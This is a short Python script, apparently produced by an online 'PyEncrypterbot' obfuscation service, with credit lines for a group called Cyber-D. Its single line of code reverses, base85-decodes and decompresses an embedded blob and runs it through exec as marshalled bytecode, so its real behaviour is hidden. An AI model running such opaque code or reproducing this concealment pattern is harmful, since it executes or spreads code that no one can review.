
#   Encrypted by PyEncrypterbot

#   Developer Cyber-D || KDO
#   instagram: https://instagram.com/cyber_d_kdo
#   Team Instagram: https://instagram.com/cyber_d_army
#   Bot link: https://t.me/PyEncrypterbot

_1nf3r10r_ = lambda __1nf3r10r__ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b85decode(__1nf3r10r__[::-1])));eval("exec((_1nf3r10r_)(b'lgTy;1X)bermv?<$qH_a&y>;fSW(Y-+q`xn=7)eSi5bwiwFQBnotu4cVp=(?ySZTE1k(a8<pDhL*PguAwxyLNz{YLb}SDu9jus+HWUOfT4o<i6o#%`5^fse!UVmvTyCU3MC|Dy(CN{17YB!0K&FX%-O$^8zh{2xu;t6tLuM>{N{2SnSgeyL@-y*iu2fk0SmW7q$dGoS*SF}Cw;Kd!ec0z06p`Bv1`D}FGM@tld*APu@6;`H6jc<3fw%5ljbE`0FF$H8$NmD!XM`J{l+U89#0^f73pVt>+yIV3=b`)|XL$Wh)61}J*Ohkd7UVkpO&BN9J3EsWNhz)HDrU`l$Zg_jnZm%g`r&|^IMyH)T)i}%6tAA+9wrkfhSvNcf7LVAizb^1@ub6!SB`T8!0*v(NcUW}p2xXoc#q9WRv)BG)wHbS5Dr%{ca_MW28h{s8X<28ZE?L{wN2Rg5-IkR>*s6i+NMvBm5N7hKJ^CKyq?%qWLt&Y@`kEsqd3;Cg(k52WH!ZfNrr?2N|8|zE;cPMyqhML2$p?FR#B|ivWr?WN!)%*w^Rc0jv#Y|mH$GT)GgTnF<LG5+^7}tC~T43WsNHnB9!N(s4Oo!{tSlT7OMmV$u&HnJh=QuJ2hJ;Sxb}cdL5e$Cx&rZ+;?rW(W&jNfyWF{Xp#-S-(T6}`mQ=DeF^1fi2=d<<6eHr{O4Q$Ba4ddif`w4K|V>S=gW700ti1z>n{@$c'))")